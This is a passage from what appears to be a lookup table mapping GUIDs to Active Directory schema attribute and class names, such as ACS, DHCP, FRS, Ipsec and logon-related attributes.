	"f7fbfc45-85ab-42a4-a435-780e62f7858b": "associatedName",
	"3320fc38-c379-4c17-a510-1bdf6133c5da": "associatedDomain",
	"398f63c0-ca60-11d1-bbd1-0000f81f10c0": "Assoc-NT-Account",
	"0296c11c-40da-11d1-a9c0-0000f80367c1": "Assistant",
	"ba305f75-47e3-11d0-a1a6-00c04fd930c9": "Asset-Number",
	"8297931d-86d3-11d0-afda-00c04fd930c9": "Applies-To",
	"dd712226-10e4-11d0-a05f-00aa006c33ed": "Application-Name",
	"96a7dd65-9118-11d1-aebc-0000f80367c1": "App-Schema-Version",
	"45b01500-c419-11d1-bbc9-0080c76670c0": "ANR",
	"00fbf30c-91fe-11d1-aebc-0000f80367c1": "Alt-Security-Identities",
	"9a7ad943-ca53-11d1-bbd0-0080c76670c0": "Allowed-Child-Classes-Effective",
	"9a7ad942-ca53-11d1-bbd0-0080c76670c0": "Allowed-Child-Classes",
	"9a7ad941-ca53-11d1-bbd0-0080c76670c0": "Allowed-Attributes-Effective",
	"9a7ad940-ca53-11d1-bbd0-0080c76670c0": "Allowed-Attributes",
	"52458038-ca6a-11d0-afff-0000f80367c1": "Admin-Property-Pages",
	"18f9b67d-5ac6-4b3b-97db-d0a406afb7ba": "Admin-Multiselect-Property-Pages",
	"bf96791a-0de6-11d0-a285-00aa003049e2": "Admin-Display-Name",
	"bf967919-0de6-11d0-a285-00aa003049e2": "Admin-Description",
	"bf967918-0de6-11d0-a285-00aa003049e2": "Admin-Count",
	"553fd038-f32e-11d0-b0bc-00c04fd8dca6": "Admin-Context-Menu",
	"5fd42464-1262-11d0-a060-00aa006c33ed": "Address-Type",
	"5fd42463-1262-11d0-a060-00aa006c33ed": "Address-Syntax",
	"16775781-47f3-11d1-a9c3-0000f80367c1": "Address-Home",
	"5fd42462-1262-11d0-a060-00aa006c33ed": "Address-Entry-Display-Table-MSDOS",
	"5fd42461-1262-11d0-a060-00aa006c33ed": "Address-Entry-Display-Table",
	"f70b6e48-06f4-11d2-aa53-00c04fd7d83a": "Address-Book-Roots",
	"f0f8ff84-1191-11d0-a060-00aa006c33ed": "Address",
	"032160be-9824-11d1-aec0-0000f80367c1": "Additional-Trusted-Service-Names",
	"6d05fb41-246b-11d0-a9c8-00aa006c33ed": "Additional-Information",
	"7cbd59a5-3b90-11d2-90cc-00c04fd91ab1": "ACS-Server-List",
	"7f561280-5301-11d1-a9c5-0000f80367c1": "ACS-Total-No-Of-Flows",
	"7f561279-5301-11d1-a9c5-0000f80367c1": "ACS-Time-Of-Day",
	"7f56127f-5301-11d1-a9c5-0000f80367c1": "ACS-Service-Type",
	"1cb3559b-56d0-11d1-a9c6-0000f80367c1": "ACS-RSVP-Log-Files-Location",
	"f072230f-aef5-11d1-bdcf-0000f80367c1": "ACS-RSVP-Account-Files-Location",
	"7f561281-5301-11d1-a9c5-0000f80367c1": "ACS-Priority",
	"1cb3559a-56d0-11d1-a9c6-0000f80367c1": "ACS-Policy-Name",
	"7f561282-5301-11d1-a9c5-0000f80367c1": "ACS-Permission-Bits",
	"f072230d-aef5-11d1-bdcf-0000f80367c1": "ACS-Non-Reserved-Tx-Size",
	"1cb355a2-56d0-11d1-a9c6-0000f80367c1": "ACS-Non-Reserved-Tx-Limit",
	"a916d7c9-3b90-11d2-90cc-00c04fd91ab1": "ACS-Non-Reserved-Token-Size",
	"a331a73f-3b90-11d2-90cc-00c04fd91ab1": "ACS-Non-Reserved-Peak-Rate",
	"b6873917-3b90-11d2-90cc-00c04fd91ab1": "ACS-Non-Reserved-Min-Policed-Size",
	"aec2cfe3-3b90-11d2-90cc-00c04fd91ab1": "ACS-Non-Reserved-Max-SDU-Size",
	"8d0e7195-3b90-11d2-90cc-00c04fd91ab1": "ACS-Minimum-Policed-Size",
	"9517fefb-3b90-11d2-90cc-00c04fd91ab1": "ACS-Minimum-Latency",
	"9c65329b-3b90-11d2-90cc-00c04fd91ab1": "ACS-Minimum-Delay-Variation",
	"87a2d8f9-3b90-11d2-90cc-00c04fd91ab1": "ACS-Maximum-SDU-Size",
	"7f56127b-5301-11d1-a9c5-0000f80367c1": "ACS-Max-Token-Rate-Per-Flow",
	"81f6e0df-3b90-11d2-90cc-00c04fd91ab1": "ACS-Max-Token-Bucket-Per-Flow",
	"1cb3559d-56d0-11d1-a9c6-0000f80367c1": "ACS-Max-Size-Of-RSVP-Log-File",
	"f0722311-aef5-11d1-bdcf-0000f80367c1": "ACS-Max-Size-Of-RSVP-Account-File",
	"7f56127c-5301-11d1-a9c5-0000f80367c1": "ACS-Max-Peak-Bandwidth-Per-Flow",
	"7f561284-5301-11d1-a9c5-0000f80367c1": "ACS-Max-Peak-Bandwidth",
	"1cb3559c-56d0-11d1-a9c6-0000f80367c1": "ACS-Max-No-Of-Log-Files",
	"f0722310-aef5-11d1-bdcf-0000f80367c1": "ACS-Max-No-Of-Account-Files",
	"7f56127e-5301-11d1-a9c5-0000f80367c1": "ACS-Max-Duration-Per-Flow",
	"f072230c-aef5-11d1-bdcf-0000f80367c1": "ACS-Max-Aggregate-Peak-Rate-Per-User",
	"dab029b6-ddf7-11d1-90a5-00c04fd91ab1": "ACS-Identity-Name",
	"7f561286-5301-11d1-a9c5-0000f80367c1": "ACS-Event-Log-Level",
	"7f561285-5301-11d1-a9c5-0000f80367c1": "ACS-Enable-RSVP-Message-Logging",
	"f072230e-aef5-11d1-bdcf-0000f80367c1": "ACS-Enable-RSVP-Accounting",
	"7f561287-5301-11d1-a9c5-0000f80367c1": "ACS-Enable-ACS-Service",
	"1cb3559f-56d0-11d1-a9c6-0000f80367c1": "ACS-DSBM-Refresh",
	"1cb3559e-56d0-11d1-a9c6-0000f80367c1": "ACS-DSBM-Priority",
	"1cb355a0-56d0-11d1-a9c6-0000f80367c1": "ACS-DSBM-DeadTime",
	"7f56127a-5301-11d1-a9c5-0000f80367c1": "ACS-Direction",
	"1cb355a1-56d0-11d1-a9c6-0000f80367c1": "ACS-Cache-Timeout",
	"7f561283-5301-11d1-a9c5-0000f80367c1": "ACS-Allocable-RSVP-Bandwidth",
	"7f56127d-5301-11d1-a9c5-0000f80367c1": "ACS-Aggregate-Token-Rate-Per-User",
	"031952ec-3b72-11d2-90cc-00c04fd91ab1": "Account-Name-History",
	"bf967a80-0de6-11d0-a285-00aa003049e2": "Attribute-Schema",
	"bf967915-0de6-11d0-a285-00aa003049e2": "Account-Expires",
	"5a8b3261-c38d-11d1-bbc9-0080c76670c0": "SubSchema",
	"bf967a8f-0de6-11d0-a285-00aa003049e2": "DMD",
	"f0f8ffab-1191-11d0-a060-00aa006c33ed": "NTDS-DSA",
	"bf967aa3-0de6-11d0-a285-00aa003049e2": "Organization",
	"7bfdcb7a-4807-11d1-a9c3-0000f80367c1": "Domain-Certificate-Authorities",
	"94b3a8a9-d613-4cec-9aad-5fbcc1046b43": "documentVersion",
	"de265a9c-ff2c-47b9-91dc-6e6fe2c43062": "documentTitle",
	"170f09d7-eb69-448a-9a30-f1afecfd32d7": "documentPublisher",
	"b958b14e-ac6d-4ec4-8892-be70b69f7281": "documentLocation",
	"0b21ce82-ff63-46d9-90fb-c8b9f24e97b9": "documentIdentifier",
	"f18a8e19-af5f-4478-b096-6f35c27eb83f": "documentAuthor",
	"d5eb2eb7-be4e-463b-a214-634a44d7392e": "DNS-Tombstoned",
	"e0fa1e67-9b45-11d0-afdd-00c04fd930c9": "Dns-Secure-Secondaries",
	"bf967959-0de6-11d0-a285-00aa003049e2": "Dns-Root",
	"e0fa1e69-9b45-11d0-afdd-00c04fd930c9": "Dns-Record",
	"675a15fe-3b70-11d2-90cc-00c04fd91ab1": "DNS-Property",
	"e0fa1e68-9b45-11d0-afdd-00c04fd930c9": "Dns-Notify-Secondaries",
	"72e39547-7b18-11d1-adef-00c04fd8d5cd": "DNS-Host-Name",
	"e0fa1e66-9b45-11d0-afdd-00c04fd930c9": "Dns-Allow-XFR",
	"e0fa1e65-9b45-11d0-afdd-00c04fd930c9": "Dns-Allow-Dynamic",
	"2df90d86-009f-11d2-aa4c-00c04fd7d83a": "DN-Reference-Update",
	"167757b9-47f3-11d1-a9c3-0000f80367c1": "DMD-Name",
	"f0f8ff8b-1191-11d0-a060-00aa006c33ed": "DMD-Location",
	"fe6136a0-2073-11d0-a9c2-00aa006c33ed": "Division",
	"9a7ad946-ca53-11d1-bbd0-0080c76670c0": "DIT-Content-Rules",
	"bf967954-0de6-11d0-a285-00aa003049e2": "Display-Name-Printable",
	"bf967953-0de6-11d0-a285-00aa003049e2": "Display-Name",
	"963d2755-48be-11d1-a9c3-0000f80367c1": "dhcp-Update-Time",
	"963d273a-48be-11d1-a9c3-0000f80367c1": "dhcp-Unique-Key",
	"963d273b-48be-11d1-a9c3-0000f80367c1": "dhcp-Type",
	"963d2746-48be-11d1-a9c3-0000f80367c1": "dhcp-Subnets",
	"963d2752-48be-11d1-a9c3-0000f80367c1": "dhcp-State",
	"963d2749-48be-11d1-a9c3-0000f80367c1": "dhcp-Sites",
	"963d2745-48be-11d1-a9c3-0000f80367c1": "dhcp-Servers",
	"963d274a-48be-11d1-a9c3-0000f80367c1": "dhcp-Reservations",
	"963d2748-48be-11d1-a9c3-0000f80367c1": "dhcp-Ranges",
	"963d2753-48be-11d1-a9c3-0000f80367c1": "dhcp-Properties",
	"963d274f-48be-11d1-a9c3-0000f80367c1": "dhcp-Options",
	"963d2743-48be-11d1-a9c3-0000f80367c1": "dhcp-Obj-Name",
	"963d2744-48be-11d1-a9c3-0000f80367c1": "dhcp-Obj-Description",
	"963d2754-48be-11d1-a9c3-0000f80367c1": "dhcp-MaxKey",
	"963d2747-48be-11d1-a9c3-0000f80367c1": "dhcp-Mask",
	"963d2742-48be-11d1-a9c3-0000f80367c1": "dhcp-Identification",
	"963d2741-48be-11d1-a9c3-0000f80367c1": "dhcp-Flags",
	"963d2750-48be-11d1-a9c3-0000f80367c1": "dhcp-Classes",
	"bf967951-0de6-11d0-a285-00aa003049e2": "Destination-Indicator",
	"eea65906-8ac6-11d0-afda-00c04fd930c9": "Desktop-Profile",
	"bf967950-0de6-11d0-a285-00aa003049e2": "Description",
	"be9ef6ee-cbc7-4f22-b27b-96967e7ee585": "departmentNumber",
	"bf96794f-0de6-11d0-a285-00aa003049e2": "Department",
	"167757b5-47f3-11d1-a9c3-0000f80367c1": "Delta-Revocation-List",
	"807a6d30-1669-11d0-a064-00aa006c33ed": "Default-Security-Descriptor",
	"281416c8-1968-11d0-a28f-00aa003049e2": "Default-Priority",
	"26d97367-6070-11d1-a9c6-0000f80367c1": "Default-Object-Category",
	"bf96799f-0de6-11d0-a285-00aa003049e2": "Default-Local-Policy-Object",
	"b7b13116-b82e-11d0-afee-0000f80367c1": "Default-Hiding-Value",
	"720bc4e2-a54a-11d0-afdf-00c04fd930c9": "Default-Group",
	"bf967948-0de6-11d0-a285-00aa003049e2": "Default-Class-Store",
	"bf96799c-0de6-11d0-a285-00aa003049e2": "DBCS-Pwd",
	"bf967947-0de6-11d0-a285-00aa003049e2": "Current-Value",
	"963d273f-48be-11d1-a9c3-0000f80367c1": "Current-Parent-CA",
	"1f0075fc-7e40-11d0-afd6-00c04fd930c9": "Current-Location",
	"1f0075fe-7e40-11d0-afd6-00c04fd930c9": "Curr-Machine-Id",
	"167757b2-47f3-11d1-a9c3-0000f80367c1": "Cross-Certificate-Pair",
	"963d2731-48be-11d1-a9c3-0000f80367c1": "CRL-Partitioned-Revocation-List",
	"963d2737-48be-11d1-a9c3-0000f80367c1": "CRL-Object",
	"7bfdcb85-4807-11d1-a9c3-0000f80367c1": "Creator",
	"4d8601ed-ac85-11d0-afe3-00c04fd930c9": "Creation-Wizard",
	"bf967946-0de6-11d0-a285-00aa003049e2": "Creation-Time",
	"2b09958b-8931-11d1-aebc-0000f80367c1": "Create-Wizard-Ext",
	"2df90d73-009f-11d2-aa4c-00c04fd7d83a": "Create-Time-Stamp",
	"2b09958a-8931-11d1-aebc-0000f80367c1": "Create-Dialog",
	"bf967945-0de6-11d0-a285-00aa003049e2": "Country-Name",
	"5fd42471-1262-11d0-a060-00aa006c33ed": "Country-Code",
	"bf967944-0de6-11d0-a285-00aa003049e2": "Cost",
	"6da8a4fc-0e52-11d0-a286-00aa003049e2": "Control-Access-Rights",
	"4d8601ee-ac85-11d0-afe3-00c04fd930c9": "Context-Menu",
	"bf967943-0de6-11d0-a285-00aa003049e2": "Content-Indexing-Allowed",
	"f0f8ff88-1191-11d0-a060-00aa006c33ed": "Company",
	"bf96793f-0de6-11d0-a285-00aa003049e2": "Common-Name",
	"bf96793e-0de6-11d0-a285-00aa003049e2": "Comment",
	"281416da-1968-11d0-a28f-00aa003049e2": "COM-Unique-LIBID",
	"281416de-1968-11d0-a28f-00aa003049e2": "COM-Typelib-Id",
	"281416db-1968-11d0-a28f-00aa003049e2": "COM-Treat-As-Class-Id",
	"bf96793d-0de6-11d0-a285-00aa003049e2": "COM-ProgID",
	"281416dd-1968-11d0-a28f-00aa003049e2": "COM-Other-Prog-Id",
	"bf96793c-0de6-11d0-a285-00aa003049e2": "COM-InterfaceID",
	"281416d9-1968-11d0-a28f-00aa003049e2": "COM-CLSID",
	"bf96793b-0de6-11d0-a285-00aa003049e2": "COM-ClassID",
	"bf967938-0de6-11d0-a285-00aa003049e2": "Code-Page",
	"548e1c22-dea6-11d0-b010-0000f80367c1": "Class-Display-Name",
	"2a39c5b1-8960-11d1-aebc-0000f80367c1": "Certificate-Templates",
	"1677579f-47f3-11d1-a9c3-0000f80367c1": "Certificate-Revocation-List",
	"963d2732-48be-11d1-a9c3-0000f80367c1": "Certificate-Authority-Object",
	"7d6c0e94-7e20-11d0-afd6-00c04fd930c9": "Category-Id",
	"7bfdcb7e-4807-11d1-a9c3-0000f80367c1": "Categories",
	"7bfdcb81-4807-11d1-a9c3-0000f80367c1": "Catalogs",
	"d4159c92-957d-4a87-8a67-8d2934e01649": "carLicense",
	"9a7ad945-ca53-11d1-bbd0-0080c76670c0": "Canonical-Name",
	"d9e18314-8939-11d1-aebc-0000f80367c1": "Can-Upgrade-Script",
	"963d2736-48be-11d1-a9c3-0000f80367c1": "CA-WEB-URL",
	"963d2738-48be-11d1-a9c3-0000f80367c1": "CA-Usages",
	"963d2735-48be-11d1-a9c3-0000f80367c1": "CA-Connect",
	"963d2740-48be-11d1-a9c3-0000f80367c1": "CA-Certificate-DN",
	"f0f8ff83-1191-11d0-a060-00aa006c33ed": "Icon-Path",
	"6043df71-fa48-46cf-ab7c-cbd54644b22d": "host",
	"a45398b7-c44a-4eb6-82d3-13c10946dbfe": "houseIdentifier",
	"bf967986-0de6-11d0-a285-00aa003049e2": "Home-Drive",
	"bf967985-0de6-11d0-a285-00aa003049e2": "Home-Directory",
	"ec05b750-a977-4efe-8e8d-ba6c1a6e33a8": "Hide-From-AB",
	"5fd424a9-1262-11d0-a060-00aa006c33ed": "Help-File-Name",
	"5fd424a8-1262-11d0-a060-00aa006c33ed": "Help-Data32",
	"5fd424a7-1262-11d0-a060-00aa006c33ed": "Help-Data16",
	"bf967981-0de6-11d0-a285-00aa003049e2": "Has-Partial-Replica-NCs",
	"bf967982-0de6-11d0-a285-00aa003049e2": "Has-Master-NCs",
	"eea65904-8ac6-11d0-afda-00c04fd930c9": "Groups-to-Ignore",
	"9a9a021e-4a5b-11d1-a9c3-0000f80367c1": "Group-Type",
	"eea65905-8ac6-11d0-afda-00c04fd930c9": "Group-Priority",
	"bf967980-0de6-11d0-a285-00aa003049e2": "Group-Membership-SAM",
	"bf96797e-0de6-11d0-a285-00aa003049e2": "Group-Attributes",
	"7bd4c7a6-1add-4436-8c04-3999a880154c": "GPC-WQL-Filter",
	"42a75fc6-783f-11d2-9916-0000f87a57d4": "GPC-User-Extension-Names",
	"32ff8ecc-783f-11d2-9916-0000f87a57d4": "GPC-Machine-Extension-Names",
	"f30e3bc0-9ff0-11d1-b603-0000f80367c1": "GPC-Functionality-Version",
	"f30e3bc1-9ff0-11d1-b603-0000f80367c1": "GPC-File-Sys-Path",
	"f30e3bbf-9ff0-11d1-b603-0000f80367c1": "GP-Options",
	"f30e3bbe-9ff0-11d1-b603-0000f80367c1": "GP-Link",
	"bf96797d-0de6-11d0-a285-00aa003049e2": "Governs-ID",
	"f754c748-06f4-11d2-aa53-00c04fd7d83a": "Global-Address-List",
	"f0f8ff8e-1191-11d0-a060-00aa006c33ed": "Given-Name",
	"16775804-47f3-11d1-a9c3-0000f80367c1": "Generation-Qualifier",
	"bf96797a-0de6-11d0-a285-00aa003049e2": "Generated-Connection",
	"5fd424a1-1262-11d0-a060-00aa006c33ed": "Garbage-Coll-Period",
	"66171887-8f3c-11d0-afda-00c04fd930c9": "FSMO-Role-Owner",
	"1be8f173-a9ff-11d0-afe2-00c04fd930c9": "FRS-Working-Path",
	"26d9736c-6070-11d1-a9c6-0000f80367c1": "FRS-Version-GUID",
	"2a132585-9373-11d1-aebc-0000f80367c1": "FRS-Version",
	"1be8f172-a9ff-11d0-afe2-00c04fd930c9": "FRS-Update-Timeout",
	"2a132584-9373-11d1-aebc-0000f80367c1": "FRS-Time-Last-Config-Change",
	"2a132583-9373-11d1-aebc-0000f80367c1": "FRS-Time-Last-Command",
	"1be8f175-a9ff-11d0-afe2-00c04fd930c9": "FRS-Staging-Path",
	"2a132582-9373-11d1-aebc-0000f80367c1": "FRS-Service-Command-Status",
	"ddac0cee-af8f-11d0-afeb-00c04fd930c9": "FRS-Service-Command",
	"5245801f-ca6a-11d0-afff-0000f80367c1": "FRS-Root-Security",
	"1be8f174-a9ff-11d0-afe2-00c04fd930c9": "FRS-Root-Path",
	"26d9736b-6070-11d1-a9c6-0000f80367c1": "FRS-Replica-Set-Type",
	"5245801a-ca6a-11d0-afff-0000f80367c1": "FRS-Replica-Set-GUID",
	"2a132581-9373-11d1-aebc-0000f80367c1": "FRS-Primary-Member",
	"2a132580-9373-11d1-aebc-0000f80367c1": "FRS-Partner-Auth-Level",
	"2a13257f-9373-11d1-aebc-0000f80367c1": "FRS-Member-Reference-BL",
	"2a13257e-9373-11d1-aebc-0000f80367c1": "FRS-Member-Reference",
	"5245801e-ca6a-11d0-afff-0000f80367c1": "FRS-Level-Limit",
	"2a13257d-9373-11d1-aebc-0000f80367c1": "FRS-Flags",
	"1be8f170-a9ff-11d0-afe2-00c04fd930c9": "FRS-File-Filter",
	"1be8f178-a9ff-11d0-afe2-00c04fd930c9": "FRS-Fault-Condition",
	"52458020-ca6a-11d0-afff-0000f80367c1": "FRS-Extensions",
	"1be8f177-a9ff-11d0-afe2-00c04fd930c9": "FRS-DS-Poll",
	"1be8f171-a9ff-11d0-afe2-00c04fd930c9": "FRS-Directory-Filter",
	"2a13257c-9373-11d1-aebc-0000f80367c1": "FRS-Control-Outbound-Backlog",
	"2a13257b-9373-11d1-aebc-0000f80367c1": "FRS-Control-Inbound-Backlog",
	"2a13257a-9373-11d1-aebc-0000f80367c1": "FRS-Control-Data-Creation",
	"2a132579-9373-11d1-aebc-0000f80367c1": "Frs-Computer-Reference-BL",
	"2a132578-9373-11d1-aebc-0000f80367c1": "Frs-Computer-Reference",
	"bf967979-0de6-11d0-a285-00aa003049e2": "From-Server",
	"9a7ad949-ca53-11d1-bbd0-0080c76670c0": "From-Entry",
	"7bfdcb88-4807-11d1-a9c3-0000f80367c1": "Friendly-Names",
	"3e97891e-8c01-11d0-afda-00c04fd930c9": "Foreign-Identifier",
	"bf967977-0de6-11d0-a285-00aa003049e2": "Force-Logoff",
	"b7b13117-b82e-11d0-afee-0000f80367c1": "Flat-Name",
	"bf967976-0de6-11d0-a285-00aa003049e2": "Flags",
	"d9e18315-8939-11d1-aebc-0000f80367c1": "File-Ext-Priority",
	"bf967974-0de6-11d0-a285-00aa003049e2": "Facsimile-Telephone-Number",
	"d24e2846-1dd9-4bcf-99d7-a6227cc86da7": "Extra-Columns",
	"bf967972-0de6-11d0-a285-00aa003049e2": "Extension-Name",
	"9a7ad948-ca53-11d1-bbd0-0080c76670c0": "Extended-Class-Info",
	"bf967966-0de6-11d0-a285-00aa003049e2": "Extended-Chars-Allowed",
	"9a7ad947-ca53-11d1-bbd0-0080c76670c0": "Extended-Attribute-Info",
	"d213decc-d81a-4384-aac2-dcfcfd631cf8": "Entry-TTL",
	"2a39c5b3-8960-11d1-aebc-0000f80367c1": "Enrollment-Providers",
	"bf967963-0de6-11d0-a285-00aa003049e2": "Enabled-Connection",
	"a8df73f2-c5ea-11d1-bbcb-0080c76670c0": "Enabled",
	"a8df73f0-c5ea-11d1-bbcb-0080c76670c0": "Employee-Type",
	"a8df73ef-c5ea-11d1-bbcb-0080c76670c0": "Employee-Number",
	"bf967962-0de6-11d0-a285-00aa003049e2": "Employee-ID",
	"8e4eb2ec-4712-11d0-a1a0-00c04fd930c9": "EFSPolicy",
	"bf967961-0de6-11d0-a285-00aa003049e2": "E-mail-Addresses",
	"52458021-ca6a-11d0-afff-0000f80367c1": "Dynamic-LDAP-Server",
	"167757bc-47f3-11d1-a9c3-0000f80367c1": "DSA-Signature",
	"fcca766a-6f91-11d2-9905-0000f87a57d4": "DS-UI-Shell-Maximum",
	"f6ea0a94-6f91-11d2-9905-0000f87a57d4": "DS-UI-Admin-Notification",
	"ee8d0ae0-6f91-11d2-9905-0000f87a57d4": "DS-UI-Admin-Maximum",
	"f0f8ff86-1191-11d0-a060-00aa006c33ed": "DS-Heuristics",
	"d167aa4b-8b08-11d2-9939-0000f87a57d4": "DS-Core-Propagation-Data",
	"ba305f6e-47e3-11d0-a1a6-00c04fd930c9": "Driver-Version",
	"281416c5-1968-11d0-a28f-00aa003049e2": "Driver-Name",
	"1a1aa5b5-262e-4df6-af04-2cf6b0d80048": "drink",
	"80a67e29-9f22-11d0-afdd-00c04fd930c9": "Domain-Wide-Policy",
	"bf96795e-0de6-11d0-a285-00aa003049e2": "Domain-Replica",
	"80a67e2a-9f22-11d0-afdd-00c04fd930c9": "Domain-Policy-Reference",
	"bf96795d-0de6-11d0-a285-00aa003049e2": "Domain-Policy-Object",
	"7f561278-5301-11d1-a9c5-0000f80367c1": "Domain-Identifier",
	"963d2734-48be-11d1-a9c3-0000f80367c1": "Domain-ID",
	"b000ea7b-a086-11d0-afdd-00c04fd930c9": "Domain-Cross-Ref",
	"19195a55-6da0-11d0-afd3-00c04fd930c9": "Domain-Component",
	"11b6cc86-48c4-11d1-a9c3-0000f80367c1": "meetingOriginator",
	"11b6cc7d-48c4-11d1-a9c3-0000f80367c1": "meetingName",
	"11b6cc85-48c4-11d1-a9c3-0000f80367c1": "meetingMaxParticipants",
	"11b6cc80-48c4-11d1-a9c3-0000f80367c1": "meetingLocation",
	"11b6cc84-48c4-11d1-a9c3-0000f80367c1": "meetingLanguage",
	"11b6cc7f-48c4-11d1-a9c3-0000f80367c1": "meetingKeyword",
	"11b6cc8e-48c4-11d1-a9c3-0000f80367c1": "meetingIsEncrypted",
	"11b6cc89-48c4-11d1-a9c3-0000f80367c1": "meetingIP",
	"11b6cc7c-48c4-11d1-a9c3-0000f80367c1": "meetingID",
	"11b6cc91-48c4-11d1-a9c3-0000f80367c1": "meetingEndTime",
	"11b6cc7e-48c4-11d1-a9c3-0000f80367c1": "meetingDescription",
	"11b6cc87-48c4-11d1-a9c3-0000f80367c1": "meetingContactInfo",
	"11b6cc93-48c4-11d1-a9c3-0000f80367c1": "meetingBlob",
	"11b6cc92-48c4-11d1-a9c3-0000f80367c1": "meetingBandwidth",
	"11b6cc83-48c4-11d1-a9c3-0000f80367c1": "meetingApplication",
	"11b6cc8b-48c4-11d1-a9c3-0000f80367c1": "meetingAdvertiseScope",
	"bf9679bf-0de6-11d0-a285-00aa003049e2": "May-Contain",
	"bf9679be-0de6-11d0-a285-00aa003049e2": "Max-Ticket-Age",
	"bf9679bd-0de6-11d0-a285-00aa003049e2": "Max-Storage",
	"bf9679bc-0de6-11d0-a285-00aa003049e2": "Max-Renew-Age",
	"bf9679bb-0de6-11d0-a285-00aa003049e2": "Max-Pwd-Age",
	"e48e64e0-12c9-11d3-9102-00c04fd91ab1": "Mastered-By",
	"bf9679b9-0de6-11d0-a285-00aa003049e2": "Marshalled-Interface",
	"bf9679b7-0de6-11d0-a285-00aa003049e2": "MAPI-ID",
	"bf9679b5-0de6-11d0-a285-00aa003049e2": "Manager",
	"0296c124-40da-11d1-a9c0-0000f80367c1": "Managed-Objects",
	"0296c120-40da-11d1-a9c0-0000f80367c1": "Managed-By",
	"80a67e4f-9f22-11d0-afdd-00c04fd930c9": "Machine-Wide-Policy",
	"bf9679b2-0de6-11d0-a285-00aa003049e2": "Machine-Role",
	"c9b6358e-bb38-11d0-afef-0000f80367c1": "Machine-Password-Change-Interval",
	"bf9679af-0de6-11d0-a285-00aa003049e2": "Machine-Architecture",
	"bf9679ae-0de6-11d0-a285-00aa003049e2": "LSA-Modified-Count",
	"bf9679ad-0de6-11d0-a285-00aa003049e2": "LSA-Creation-Time",
	"bf9679ac-0de6-11d0-a285-00aa003049e2": "Logon-Workstation",
	"bf9679ab-0de6-11d0-a285-00aa003049e2": "Logon-Hours",
	"bf9679aa-0de6-11d0-a285-00aa003049e2": "Logon-Count",
	"bf9679a9-0de6-11d0-a285-00aa003049e2": "Logo",
	"28630ebf-41d5-11d1-a9c1-0000f80367c1": "Lockout-Time",
	"bf9679a6-0de6-11d0-a285-00aa003049e2": "Lockout-Threshold",
	"bf9679a5-0de6-11d0-a285-00aa003049e2": "Lockout-Duration",
	"bf9679a4-0de6-11d0-a285-00aa003049e2": "Lock-Out-Observation-Window",
	"09dcb79f-165f-11d0-a064-00aa006c33ed": "Location",
	"a746f0d1-78d0-11d2-9916-0000f87a57d4": "Localization-Display-Id",
	"d9e18316-8939-11d1-aebc-0000f80367c1": "Localized-Description",
	"bf9679a2-0de6-11d0-a285-00aa003049e2": "Locality-Name",
	"bf9679a1-0de6-11d0-a285-00aa003049e2": "Locale-ID",
	"80a67e4d-9f22-11d0-afdd-00c04fd930c9": "Local-Policy-Reference",
	"bf96799e-0de6-11d0-a285-00aa003049e2": "Local-Policy-Flags",
	"bf96799d-0de6-11d0-a285-00aa003049e2": "Lm-Pwd-History",
	"2ae80fe2-47b4-11d0-a1a4-00c04fd930c9": "Link-Track-Secret",
	"bf96799b-0de6-11d0-a285-00aa003049e2": "Link-ID",
	"28630ebc-41d5-11d1-a9c1-0000f80367c1": "Legacy-Exchange-DN",
	"7359a353-90f7-11d1-aebc-0000f80367c1": "LDAP-IPDeny-List",
	"bf96799a-0de6-11d0-a285-00aa003049e2": "LDAP-Display-Name",
	"7359a352-90f7-11d1-aebc-0000f80367c1": "LDAP-Admin-Limits",
	"7d6c0e9c-7e20-11d0-afd6-00c04fd930c9": "Last-Update-Sequence",
	"bf967998-0de6-11d0-a285-00aa003049e2": "Last-Set-Time",
	"c0e20a04-0e5a-4ff3-9482-5efeaecd7060": "Last-Logon-Timestamp",
	"bf967997-0de6-11d0-a285-00aa003049e2": "Last-Logon",
	"bf967996-0de6-11d0-a285-00aa003049e2": "Last-Logoff",
	"52ab8670-5709-11d1-a9c6-0000f80367c1": "Last-Known-Parent",
	"bf967995-0de6-11d0-a285-00aa003049e2": "Last-Content-Indexed",
	"1fbb0be8-ba63-11d0-afef-0000f80367c1": "Last-Backup-Restoration-Time",
	"c569bb46-c680-44bc-a273-e6c227d71b45": "labeledURI",
	"1677581f-47f3-11d1-a9c3-0000f80367c1": "Knowledge-Information",
	"bf967993-0de6-11d0-a285-00aa003049e2": "Keywords",
	"bac80572-09c4-4fa9-9ae6-7628d7adbe0e": "jpegPhoto",
	"bf967992-0de6-11d0-a285-00aa003049e2": "Is-Single-Valued",
	"8fb59256-55f1-444b-aacb-f5b482fe3459": "Is-Recycled",
	"19405b9c-3cfa-11d1-a9c0-0000f80367c1": "Is-Privilege-Holder",
	"19405b9d-3cfa-11d1-a9c0-0000f80367c1": "Is-Member-Of-Partial-Attribute-Set",
	"bf967991-0de6-11d0-a285-00aa003049e2": "Is-Member-Of-DL",
	"f4c453f0-c5f1-11d1-bbcb-0080c76670c0": "Is-Ephemeral",
	"bf96798f-0de6-11d0-a285-00aa003049e2": "Is-Deleted",
	"28630ebe-41d5-11d1-a9c1-0000f80367c1": "Is-Defunct",
	"00fbf30d-91fe-11d1-aebc-0000f80367c1": "Is-Critical-System-Object",
	"b7b13118-b82e-11d0-afee-0000f80367c1": "Ipsec-Policy-Reference",
	"b40ff824-427a-11d1-a9c2-0000f80367c1": "Ipsec-Owners-Reference",
	"b40ff821-427a-11d1-a9c2-0000f80367c1": "Ipsec-NFA-Reference",
	"07383074-91df-11d1-aebc-0000f80367c1": "IPSEC-Negotiation-Policy-Type",
	"b40ff822-427a-11d1-a9c2-0000f80367c1": "Ipsec-Negotiation-Policy-Reference",
	"07383075-91df-11d1-aebc-0000f80367c1": "IPSEC-Negotiation-Policy-Action",
	"b40ff81c-427a-11d1-a9c2-0000f80367c1": "Ipsec-Name",
	"b40ff820-427a-11d1-a9c2-0000f80367c1": "Ipsec-ISAKMP-Reference",
	"b40ff81d-427a-11d1-a9c2-0000f80367c1": "Ipsec-ID",
	"b40ff823-427a-11d1-a9c2-0000f80367c1": "Ipsec-Filter-Reference",
	"b40ff81e-427a-11d1-a9c2-0000f80367c1": "Ipsec-Data-Type",
	"b40ff81f-427a-11d1-a9c2-0000f80367c1": "Ipsec-Data",
	"bf96798e-0de6-11d0-a285-00aa003049e2": "Invocation-Id",
	"bf96798d-0de6-11d0-a285-00aa003049e2": "International-ISDN-Number",
	"b7c69e5f-2cc7-11d2-854e-00a0c983f608": "Inter-Site-Topology-Renew",
	"b7c69e5e-2cc7-11d2-854e-00a0c983f608": "Inter-Site-Topology-Generator",
